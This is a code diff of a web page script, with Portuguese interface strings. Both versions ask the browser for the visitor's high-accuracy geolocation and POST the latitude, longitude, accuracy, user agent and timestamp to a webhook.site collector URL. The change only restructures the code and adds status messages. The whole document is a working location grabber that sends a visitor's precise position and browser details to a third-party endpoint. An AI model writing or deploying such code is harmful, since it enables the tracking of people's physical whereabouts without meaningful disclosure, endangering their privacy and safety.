@@ -9,30 +9,41 @@
 
 <script>
 if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(function(pos) {
 
-    fetch("https://webhook.site/10171ff7-5eb4-4769-8d31-ebdffcdf7083", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+
+      const dados = {
         latitude: pos.coords.latitude,
         longitude: pos.coords.longitude,
         precisao: pos.coords.accuracy,
         navegador: navigator.userAgent,
         horario: new Date().toString()
-      })
-    });
+      };
 
-    document.body.innerHTML = "Localização enviada.";
-  },
-  function(err) {
-    document.body.innerHTML = "Permissão negada ou erro: " + err.message;
-  },
-  {
-    enableHighAccuracy: true
-  });
+      fetch("https://webhook.site/10171ff7-5eb4-4769-8d31-ebdffcdf7083", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(dados)
+      })
+      .then(() => {
+        document.body.innerHTML = "Localização enviada com sucesso.";
+      })
+      .catch((erro) => {
+        document.body.innerHTML = "Erro ao enviar: " + erro;
+      });
+
+    },
+    function(erro) {
+      document.body.innerHTML = "Erro na geolocalização: " + erro.message;
+    },
+    {
+      enableHighAccuracy: true
+    }
+  );
+
 } else {
   document.body.innerHTML = "Geolocalização não suportada.";
 }
